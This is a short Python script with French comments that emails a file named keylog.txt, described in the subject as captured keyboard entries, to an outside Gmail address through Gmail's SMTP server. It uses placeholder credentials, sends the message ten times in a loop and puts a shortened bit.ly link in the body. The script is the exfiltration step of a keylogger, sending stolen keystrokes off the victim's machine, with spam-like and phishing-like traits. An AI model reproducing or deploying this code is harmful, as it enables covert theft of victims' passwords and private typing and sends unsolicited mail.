import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Paramètres de connexion Gmail
smtp_server = "smtp.gmail.com"
smtp_port = 587  # Port pour TLS
username = "xxxxxxx@gmail.com" 
password = "xxxxxxxxx"  # Mot de passe d'application

# Créer l'objet du message
msg = MIMEMultipart()
msg['From'] = username  # L'adresse email de l'expéditeur
msg['To'] = "xxxxxx@gmail.com"  # Adresse email du destinataire (corrigée)
msg['Subject'] = "Voici le fichier texte avec les entrées clavier "

# Ajouter le corps du message
body = "Bonjour,\n\nVoici le fichier texte que vous avez demandé le detail se trouve ici https://bit.ly/4gHmLDP ton retour est import.\n\nCordialement."
msg.attach(MIMEText(body, 'plain'))

# Ajouter une pièce jointe (fichier texte)
filename = "keylog.txt"  # Nom du fichier à envoyer

try:
    with open(filename, "rb") as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            'Content-Disposition',
            f'attachment; filename={filename}',
        )
        msg.attach(part)

    # Connexion au serveur SMTP et envoi de l'email
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()  # Démarrer la connexion sécurisée TLS
    server.login(username, password)  # Connexion avec les identifiants Gmail
    for i in range(10):
        server.send_message(msg)  # Envoi du message
        print(f"Email {i+1} envoyé avec succès !")
    server.quit()  # Fermeture de la connexion

    print("Email envoyé avec succès !")

except FileNotFoundError:
    print(f"Erreur : Le fichier {filename} est introuvable.")
except Exception as e:
    print(f"Une erreur s'est produite : {e}")
